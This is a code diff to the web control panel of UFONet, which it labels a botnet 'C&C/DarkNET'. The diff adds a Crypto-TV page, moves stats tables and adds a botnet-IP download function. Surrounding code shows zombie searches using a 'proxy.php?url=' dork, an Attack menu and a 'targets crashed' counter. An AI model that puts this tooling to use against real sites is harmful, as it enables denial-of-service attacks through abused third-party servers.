@@ -33,7 +33,7 @@ default_blackhole = '176.28.23.46' # default blackhole            #
 crypto_key = "U-NATi0n!" # default enc/dec (+moderator board) key #
 ###################################################################
 
-browser_init_page = "https://searchencrypt.com" # initial webpage for ship.browser [OK! 06/06/2020]
+browser_init_page = "https://searchencrypt.com" # initial webpage for ship.browser [OK! 16/06/2021]
 check_ip_service1 = 'https://checkip.org/' # set external check ip service 1 [OK! 06/06/2020]
 check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020]
 check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! [06/06/2020]
@@ -411,14 +411,18 @@ function Streams() {
 <center>
 <table cellpadding="5" cellspacing="5"><tr>
 <td><a href="javascript:alert('CR1SPR-9-AI says: This is your ship, """ + self.ranking + """... Not bad, Eeeeh!?.');"><img src='data:image/png;base64,"""+self.mothership_img+"""'></a></td><td>
-<td>STATS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit TV.streams..." onclick="Streams()">VISIT STREAMS!</button></td>
+<td>STATS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit Streams..." onclick="Streams()">VISIT STREAMS!</button></td>
 </tr></table>
 <table border="0" cellpadding="5" cellspacing="10"><tr><td>
-<table border="1" cellpadding="5" cellspacing="10"><tr>
-<td><b><u>General:</u></b></td></tr>
+<table border="1" cellpadding="5" cellspacing="10">
 <tr>
-<td>RANKING:</td><td align='right'>""" + str(your_ranking) + """</td></tr>
-<tr><td>Flying (times):</td><td align='right'><font color='red'>""" + str(self.aflying) + """</font></td></tr>
+<td><b><u>Globalnet:</u></b></td></tr>
+<tr>
+<td>GLOBAL.RADAR (nodes):</td><td align='right'><font color='orange'><a href="/radar" target="_blank">"""+str(len(self.list_globalnet))+"""</a></font></td>
+</tr>
+<tr>
+<td>SHIP.WARPS (nodes):</td><td align='right'><font color='orange'><a href="/blackholes" target="_blank">"""+str(len(self.list_blackholes))+"""</a></font></td>
+</tr>
 </table>
 <br>
 <table border="1" cellpadding="5" cellspacing="10"><tr>
@@ -431,6 +435,17 @@ function Streams() {
 <td>Targets (crashed):</td><td align='right'><font color='green'>""" + str(self.tcrashed) + """</font></td></tr>
 <tr>
 <td>Crashing (T*100/A=C%):</td><td align='right'><font color='orange'>""" + str(round(self.mothership_acc, 2)) + """%</font></td></tr>
+</table>
+</td><td>
+<br>
+<table border="1" cellpadding="5" cellspacing="10"><tr>
+<td><b><u>General:</u></b></td></tr>
+<tr>
+<td>Mothership ID:</td><td align='right'><font color='cyan'><b>""" + str(self.mothership_id) + """</b></font></td></tr> 
+<td>Model:</td><td align='right'><font color='blue'>""" + str(self.mothership_model) + """</font></td></tr> 
+<tr><td>Born:</td><td align='right'><font color='orange'>""" + str(time.ctime(os.path.getctime('ufonet'))) + """</font></td></tr>
+<tr><td>Ranking:</td><td align='right'>""" + str(your_ranking) + """</td></tr>
+<tr><td>Flying (times):</td><td align='right'><font color='red'><b>""" + str(self.aflying) + """</b></font></td></tr>
 </table>
 </td><td>
 <table border="1" cellpadding="5" cellspacing="10"><tr>
@@ -581,7 +596,7 @@ function RefreshNews(){
 <center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
 <td>Blackhole/IP:</td>
 <td><input type="text" name="news_source" id="news_source" size="20" value='"""+default_blackhole+"""'></td> 
-</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshNews()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search News...</button></td></tr></table>
+</tr></table></td><td><button title="Search for news on that blackhole..." onclick="RefreshNews()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search News...</button></td></tr></table>
 <hr>
 <table cellpadding="5" cellspacing="5"><tr>
 <td><a href="javascript:alert('Psihiz says: """ + self.ranking + """... Welcome to the Crypto-News!...');"><img src='data:image/png;base64,"""+self.alien1_img+"""'></a></td><td>
@@ -597,6 +612,74 @@ Your key: <input type="text" name="news_key" id="news_key" size="20" value='"""+
 Last update: <font color='"""+ self.news_status_color + """'>"""+ self.news_datetime + """</font><br><br>
 <div id="cmdOut"></div>
 <div id="nb1" style="display: block;">"""+self.news_text+"""</div><br><br>
+""" + self.pages["/footer"]
+
+    def html_tv(self):
+        return self.pages["/header"] + """<script language="javascript">
+function Decrypt_tv(){
+        tv_deckey=document.getElementById("tv_deckey").value
+        if(tv_deckey == "") {
+          window.alert("You need to enter a valid key (provided by someone)");
+          return
+         }else{
+          params="tv_deckey="+escape(tv_deckey)
+         runCommandX("cmd_decrypt_tv",params)
+         document.getElementById("nb1").style.display = "none";
+         }
+      }
+</script>
+<script language="javascript">
+function RefreshTv(){
+        tv_source=document.getElementById("tv_source").value
+        if(tv_source == "") {
+          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
+          return
+         }else{
+          params="tv_source="+escape(tv_source)
+         runCommandX("cmd_refresh_tv",params)
+         document.getElementById("nb1").style.display = "none";
+         setTimeout("location.reload()", 10000)
+         }
+      }
+</script>
+<script type="text/javascript">
+function PlayTV(url_tv){
+    var player=document.getElementById('player');
+    var tv_stream_source=document.getElementById('player');
+    var tv_a=document.getElementById('tv_a');
+    var tv_p=document.getElementById('tv_p');
+    tv_stream_source.src=url_tv;
+    tv_a.href=url_tv;
+    tv_p.innerHTML=url_tv;
+    player.load();
+    player.play(); 
+}
+</script>
+</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<br>
+<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
+<td>Blackhole/IP:</td>
+<td><input type="text" name="tv_source" id="tv_source" size="20" value='"""+default_blackhole+"""'></td> 
+</tr></table></td><td><button title="Search for videos on that blackhole..." onclick="RefreshTv()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search TV...</button></td></tr></table>
+<hr>
+<table cellpadding="5" cellspacing="5">
+<tr>
+  <td><a href="javascript:alert('GrouNmnrrürr says: """ + self.ranking + """... Welcome to the Crypto-TV!...');"><img src='data:image/png;base64,"""+self.alien5_img+"""'></a></td>
+<td>
+  <table cellpading="5" cellspacing="10"><tr><td>
+   <form method='GET'>
+     Your key: <input type="text" name="tv_deckey" id="tv_deckey" size="20" value='"""+str(self.crypto_key)+"""'>
+    </td></tr><tr><td>
+    <a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_tv();>Try decryption!</a>
+  </form>
+</td></tr></table>
+</td></tr></table>
+<br>
+<hr><br>
+Last update: <font color='"""+ self.tv_status_color + """'>"""+ self.tv_datetime + """</font><br><br>
+<div id="cmdOut"></div>
+<div id="nb1" style="display: block;">"""+self.tv_text+"""</div><br><br>
 """ + self.pages["/footer"]
 
     def html_missions(self):
@@ -633,7 +716,7 @@ function RefreshMissions(){
 <center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
 <td>Blackhole/IP:</td>
 <td><input type="text" name="missions_source" id="missions_source" size="20" value='"""+default_blackhole+"""'></td> 
-</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshMissions()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search missions...</button></td></tr></table>
+</tr></table></td><td><button title="Search for missions on that blackhole..." onclick="RefreshMissions()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search missions...</button></td></tr></table>
 <hr>
 <table cellpadding="5" cellspacing="5"><tr>
 <td><a href="javascript:alert('Mnahät says: """ + self.ranking + """... Welcome to the Crypto-Missions!...');"><img src='data:image/png;base64,"""+self.alien2_img+"""'></a></td><td>
@@ -677,7 +760,7 @@ Last update: <font color='"""+ self.missions_status_color + """'>"""+ self.missi
         if device_state == "OFF":
             sync_panel = ""
         else:
-            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source' id='board_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for records on that blackhole...' onclick='SyncBoard()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><br><hr>"
+            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source' id='board_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for posts on that blackhole...' onclick='SyncBoard()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><br><hr>"
         if device_state == "OFF":
             board_panel = ""
         else:
@@ -1284,7 +1367,7 @@ function GridFilter(filter, key){
 <canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
 <br><center>
 <table cellpadding="5" cellspacing="5"><tr>
-<td><a href="javascript:alert('7337-VH13 says: """ + self.ranking + """... Welcome to the Grid!. A good place to represent our Federation.');"><img src='data:image/png;base64,"""+self.alien6_img+"""'></a></td><td>
+<td><a href="javascript:alert('7337-VH13 says: """ + self.ranking + """... Welcome to the Crypto-Grid!. A good place to represent our Federation.');"><img src='data:image/png;base64,"""+self.alien6_img+"""'></a></td><td>
 <table cellpading="5" cellspacing="10"><tr><td>"""+device+"""<br><button title="Set your profile for this device..." onclick="GridProfile()">CONFIGURE!</button> """+remove_grid+"""</td></tr></table></tr></table>
 <hr><div id='sync_panel_block' name='sync_panel_block' style='display:none;'>"""+sync_panel+"""</div><div id='transfer_panel' name='transfer_panel' style='display:none;'>"""+transfer_panel+"""</div><div id="dec_panel" style="display:none;">"""+dec_panel+"""<hr></div>"""+grid_panel+"""
 """ + self.pages["/footer"]
@@ -2081,9 +2164,8 @@ function Send() {
 <br>
 <center>
 <table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
-  <td><a href="javascript:alert('Senator M.BIRDY says: Welcome ..., """ + self.ranking + """,... These are other visible motherships detected by our technology, that are currently working for the Federation... You can contribute by uploading your location... Remember, to be a strong network, always depends on you!');"><img src='data:image/png;base64,"""+self.alien11_img+"""'></a></td>
-  <td>RADAR device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit visible blackhole.Warps..." onclick="Warps()">VISIT WARPS!</button></td>
-</tr></table>
+  <td><a href="javascript:alert('Senator M.BIRDY says: Welcome ..., """ + self.ranking + """,... These are other visible motherships detected by our technology that are currently working for the Federation... You can contribute by uploading your location... Remember, to be a strong network always depends on you!');"><img src='data:image/png;base64,"""+self.alien11_img+"""'></a></td>
+  <td>RADAR device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit visible blackhole.Warps..." onclick="Warps()">VISIT WARPS!</button></td></tr></table>
 <hr><br>
 <center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='globalnet_source' id='globalnet_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'locations' proposed by other motherships..." onclick="SyncGlobalnet()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="globalnet_deckey" id="globalnet_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_globalnet();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr>
 <td>Owner (your nick):</td><td><input type="text" maxlength="12" pattern=".{3,12}" title="3 to 12 characters" name="globalnet_owner" id="globalnet_owner" size="12" placeholder="Anonymous"></td></tr><tr><td>Ship Description (short comment):</td><td><input type="text" maxlength="90" name="globalnet_comment" id="globalnet_comment" size="90" placeholder="Uplink open from 00:00-GMT3 until 02:00-GMT3"></td></tr><tr><td>WARPING:</td><td> <select id="globalnet_warp">
@@ -2110,12 +2192,18 @@ function Start(){
         }
         runCommandX("cmd_abduction",params)
 }
-</script></head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+</script></head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
 <canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
 <br>
 <center>
-<table cellpadding="5" cellspacing="5"><tr>
-<td><a href="javascript:alert('Ofgöfeejh says: """ + self.ranking + """... Lets research about our enemies first, right?...');"><img src='data:image/png;base64,"""+self.alien7_img+"""'></a></td>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>
+ </td>
+ <td>
+        <table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
+        <tr>
 <td>
 <pre>
   This feature will provide you information about target's web server. 
@@ -2124,14 +2212,14 @@ function Start(){
   <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button>
 
 <hr>
-  * Set your target: <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
+  Set your target: <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
 
 <hr>
    <button title="Start to research about your target's webserver configuration..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">RESEARCH!</button> 
 </pre>
 </td></tr></table>
-<hr><br>
-<div id="cmdOut"></div>""" + self.pages["/footer"]
+<br><br><hr><br>
+<div id="cmdOut"></div><center>""" + self.pages["/footer"]
 
     def html_blackholes(self):
         return self.pages["/header"] + """<script language="javascript">
@@ -2454,12 +2542,25 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
         self.snmps_file = "botnet/snmp.txt" # set source path to retrieve 'snmps'
         self.release_date_file = "docs/release.date" # set source path to retrieve release date
         self.news = "data/news.txt" # set source path to retrieve server news
+        self.tv = "data/tv.txt" # set source path to retrieve server tv
         self.missions = "data/missions.txt" # set source path to retrieve server missions
         self.mothership_webcfg_file = 'core/json/webcfg.json' # set source for mothership webcfg
         self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
         self.mothership_boardcfg_file = 'core/json/boardcfg.json' # set source for mothership boardcfg
         self.mothership_gridcfg_file = 'core/json/gridcfg.json' # set source for mothership gridcfg
         self.mothership_supplycfg_file = 'core/json/supplycfg.json' # set source for mothership supplyscfg
+        self.mothership_model_file = 'core/txt/model.txt' # set source for mothership model
+        f = open(self.mothership_model_file) # extract mothership model
+        self.mothership_model = f.read()
+        f.close()
+        self.faq_file = 'docs/FAQ.html' # set source for FAQ
+        f = open(self.faq_file) # extract FAQ text
+        self.faq_text = f.read()
+        f.close()
+        self.author_file = 'docs/AUTHOR' # set source for AUTHOR
+        f = open(self.author_file) # extract AUTHOR text
+        self.author_text = f.read()
+        f.close()
         self.ranking = "Rookie Star" # set starting rank
         self.decryptedtext = "" # set buffer for decryption
         self.encryptedtext = "" # set buffer for encryption
@@ -2544,6 +2645,20 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
             self.news_status_color = "red" # set status color for news to 'red'
         else:
             self.news_status_color = "green" # set status color for news to 'green'
+        f = open(self.tv) # double extract tv
+        self.tv_text = f.read()
+        f.close()
+        f = open(self.tv)
+        self.tv_block = f.readlines()
+        f.close()
+        self.list_tv = []
+        for n in self.tv_block:
+            self.list_tv.append(n)
+        self.tv_datetime = time.ctime(os.path.getctime('data/tv.txt')) # extract tv.txt datetime
+        if self.tv_datetime == self.release_date_file: # never connected to feeds
+            self.tv_status_color = "red" # set status color for tv to 'red'
+        else:
+            self.tv_status_color = "green" # set status color for tv to 'green'
         f = open(self.board_file) # double extract board
         self.moderator_text = f.read()
         f.close()
@@ -2767,14 +2882,10 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
                 self.wargames_engage_list.append(l)
                 self.supply_wargames = self.supply_wargames + 1
         if self.supply_wargames > 0:
-            if self.supply_wargames == 1:
-                c_supply = "wargame"
-            else:
-                c_supply = "wargames"
-            self.current_tasks = '<br>-----------------------------------\n\n+ Jobs: <a href="/wargames">' + str(self.supply_wargames) + '</a> '+c_supply+''
+            self.current_tasks = ' - Jobs: <a href="/wargames" target="_blank">' + str(self.supply_wargames) + '</a>'
             self.wargames_engage_routine(self.wargames_engage_list) # threaded jobs engage routine
         else:
-           self.current_tasks = ""
+            self.current_tasks = ' - Jobs: <a href="/wargames" target="_blank">0</a>'
         self.options = UFONetOptions()
         self.pages = {}
         self.pages["/header"] = """<!DOCTYPE html><html>
@@ -2875,37 +2986,32 @@ startTyping(text, 80, "tt");
         self.pages["/gui"] = self.pages["/header"] + """<script>function News() {
         var win_requests = window.open("news","_blank","fullscreen=no, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Missions() {
+function Missions() {
         var win_requests = window.open("missions","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Stats() {
+function Stats() {
         var win_requests = window.open("stats","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Board() {
+function Browser() {
+        var win_requests = window.open("browser","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
+      }
+function Board() {
         var win_requests = window.open("board","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Links() {
+function Links() {
         var win_requests = window.open("links","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Streams() {
+function Streams() {
         var win_requests = window.open("streams","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Games() {
-        var win_requests = window.open("games","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
+function TV() {
+        var win_requests = window.open("tv","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
       }
-</script>
-<script>function Browser() {
-        var win_browser = window.open("browser","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
+function Grid() {
+        var win_requests = window.open("grid","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
-</script>
-<script>function GlobalNet() {
-        var win_global_net = window.open("globalnet","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
+function Wargames() {
+        var win_requests = window.open("wargames","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
 </script>
 </head>
@@ -2919,9 +3025,9 @@ startTyping(text, 80, "tt");
 <ul>
   <li class="main"><a target="_blank" href="wormhole">Wormhole</a></li>
   <li class="top"><a href="botnet">Botnet</a></li>
-  <li class="right"><a href="inspect">Inspect</a></li>
+  <li class="right"><a href="explore">Explore</a></li>
   <li class="bottom"><a href="attack">Attack</a></li>
-  <li class="left"><a href="help">Help</a></li>
+  <li class="left"><a href="globalnet">Globalnet</a></li>
 </ul>
 </div>
  </td>
@@ -2929,18 +3035,25 @@ startTyping(text, 80, "tt");
 <table border="1" bgcolor="black" cellpadding="24" cellspacing="25">
 <tr>
 <td>
-<pre>Welcome to: <a href="https://ufonet.03c8.net/" target="_blank">UFONet</a> ;-)
+<pre>Welcome to: <a href="https://ufonet.03c8.net/" target="_blank">UFONet</a> [ <b>C&C/DarkNET</b> ] 
 
-----------------------------------
-""" + self.options.version + """ 
+------------------------------------
+
+| <a href="/help" target="_blank">HELP</a> - <a href="/faq" target="_blank">F.A.Q.</a> | <a href="/author" target="_blank">AUTHOR</a> |
+
+------------------------------------<b>
+""" + self.options.version + """</b> 
  - Rel: """ + self.release_date + """ - Dep: """ + time.ctime(os.path.getctime('ufonet')) + """ 
 
- | <a href='javascript:runCommandX("cmd_check_tool")'>Update</a> | <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">Code</a> - <a href="https://github.com/epsylon/ufonet" target="_blank">Mirror</a> | <a href='javascript:runCommandX("cmd_view_changelog")'>Logs</a> |
+| <a href='javascript:runCommandX("cmd_view_changelog")'>LOG</a> | <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">C0DE</a> - <a href="https://github.com/epsylon/ufonet" target="_blank">MIRROR</a> - <a href="https://ufonet.03c8.net/ufonet/ufonet-v1.7.tar.gz.torrent" target="_blank">SEED</a> | <a href='javascript:runCommandX("cmd_check_tool")'>UPDATE!</a> |
 
------------------------------------
+-------------------------------------
 
 Mothership ID: <b>""" + str(self.mothership_id) + """</b>
- - Your ranking is: <a href="/ranking" target="_blank"><b>""" + str(self.ranking) + """</b></a>
+ - Stats: <a href="/stats" target="_blank"><b>""" + str(self.mothership_model) + """</b></a>
+ - Ranking: <a href="/ranking" target="_blank"><b>""" + str(self.ranking) + """</b></a><br>
+ - Chargo: <a href='javascript:runCommandX("cmd_list_army")'><b>"""+ self.total_botnet +"""</b></a><br>
+ - Nodes: <a href='javascript:runCommandX("cmd_list_nodes")'><b>"""+str(len(self.list_globalnet)+len(self.list_blackholes))+"""</b></a><br>
 """+str(self.current_tasks)+"""</td>
 <td>
  <table>
@@ -2948,7 +3061,8 @@ Mothership ID: <b>""" + str(self.mothership_id) + """</b>
   <td>
   <table cellpadding="2" cellspacing="5">
     <tr>
-<td align="right"><img src='data:image/png;base64,"""+self.alien1_img+"""' onclick="News()"><br><a href="javascript:News()">NEWS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien2_img+"""' onclick="Missions()"><br><a href="javascript:Missions()">MISSIONS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien5_img+"""' onclick="Stats()"><br><a href="javascript:Stats()">SHIP.STATS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien4_img+"""' onclick="Board()"><br><a href="javascript:Board()">SHIP.BOARD</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien10_img+"""' onclick="Links()"><br><a href="javascript:Links()">SHIP.LINKS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien9_img+"""' onclick="javascript:Streams()"><br><a href="javascript:Streams()">SHIP.STREAMS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien12_img+"""' onclick="javascript:Games()"><br><a href="javascript:Games()">SHIP.GAMES</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien13_img+"""' onclick="javascript:Browser()"><br><a href="javascript:Browser()">SHIP.BROWSER</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien11_img+"""' onclick="GlobalNet()"><br><a href="javascript:GlobalNet()">GLOBAL.NET</a></td>
+<td align="right"><img src='data:image/png;base64,"""+self.alien13_img+"""' onclick="Browser()"><br><a href="Browser()">SHIP.BROWSER</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien1_img+"""' onclick="News()"><br><a href="News()">SHIP.NEWS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien2_img+"""' onclick="Missions()"><br><a href="Missions()">SHIP.MISSIONS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien5_img+"""' onclick="TV()"><br><a href="TV()">SHIP.TV</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien10_img+"""' onclick="Links()"><br><a href="Links()">GLOBAL.LINKS</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien9_img+"""' onclick="Streams()"><br><a href="Streams()">GLOBAL.STREAMS</a></td></tr><tr><td align="right"><img src='data:image/png;base64,"""+self.alien4_img+"""' onclick="Board()"><br><a href="Board()">GLOBAL.BOARD</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien6_img+"""' onclick="Grid()"><br><a href="Grid()">GLOBAL.GRID</a></td><td align="right"><img src='data:image/png;base64,"""+self.alien8_img+"""' onclick="Wargames()"><br><a href="Wargames()">GLOBAL.WARGAMES</a>
+</td></tr></table>
  </tr>
  </table>
  </td>
@@ -2998,6 +3112,11 @@ function Start(){
         runCommandX("cmd_search",params)      
          }
       }
+function Download_Botnet_IP(){
+        blackhole=document.getElementById("download_botnet_ip").value
+        params="blackhole="+escape(blackhole)
+        runCommandX("cmd_download_botnet_ip",params)      
+         }
 function showHide() 
      {
         if(document.getElementById("dork_list").checked) 
@@ -3042,10 +3161,6 @@ function HideAll()
         }
      }
 </script>
-<script>function Blackholes() {
-        var win_requests = window.open("blackholes","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=860, height=480, resizable=yes", false);
-      }
-</script>
 </head>
 <body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
 <canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
@@ -3056,8 +3171,8 @@ function HideAll()
 <div class="ringMenu">
 <ul>
   <li class="main"><a href="botnet">Botnet</a></li>
-  <li class="top"><a href="help">Help</a></li>
-  <li class="right"><a href="inspect">Inspect</a></li>
+  <li class="top"><a href="globalnet">Globalnet</a></li>
+  <li class="right"><a href="explore">Explore</a></li>
   <li class="bottom"><a href="attack">Attack</a></li>
   <li class="left"><a href="gui">RETURN</a></li>
 </ul>
@@ -3067,31 +3182,32 @@ function HideAll()
 <table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
 <tr><td>
 <pre>
- <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | * View Botnet: <button title="Build a map and geo-deploy your botnet on it..." onclick="Maps()">Generate map!</button>
-<form method='GET'><br/><hr><div id="autosearch_pattern" style="display:block;">  
-  * Search automatically (may take time!) <input type="checkbox" id="autosearch" onchange="HideAll()"></div><div id="dork_pattern" style="display:block;">  
-  * Search using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div><div id="list_pattern" style="display:block;">  
-  * Search using a list (from: botnet/dorks.txt): <input type="checkbox" id="dork_list" onchange="showHide()"></div><div id="s_engine" name="s_engine" style="display:block;">  
+ <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button>
+<form method='GET'><br><hr><br>Search Botnet:<br><div id="autosearch_pattern" style="display:block;">  
+  * Search automatically (may take time!) <input type="checkbox" CHECKED id="autosearch" onchange="HideAll()"></div><div id="dork_pattern" style="display:none;">  
+  * Search using a dork: <input type="text" name="dork" id="dork" size="20" placeholder="proxy.php?url="></div><div id="list_pattern" style="display:none;">  
+  * Search using a list (from: botnet/dorks.txt): <input type="checkbox" id="dork_list" onchange="showHide()"></div><div id="s_engine" name="s_engine" style="display:none;">  
   * Search using this search engine: <select id="engines_list">
   <option value="duck" selected>duck</option>
   <option value="bing">bing</option>
   <option value="yahoo">yahoo</option>
 <!--  <option value="google">google (no TOR!)</option>-->
 <!--  <option value="yandex">yandex</option>-->
-  </select></div><div id="allengines_pattern" style="display:block;">
+  </select></div><div id="allengines_pattern" style="display:none;">
   * Search using all search engines: <input type="checkbox" name="all_engines" id="all_engines" onchange="showHideEngines()"></div><div id="sex_engine" name="sex_engine" style="display:none;">
   * Exclude this search engines: <input type="text" name="exclude_engines" id="exclude_engines" size="10" placeholder="Yahoo,Bing"></div></form>
   <button title="Start to search for zombies..." style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Start()>SEARCH!</button>
 <br><hr>
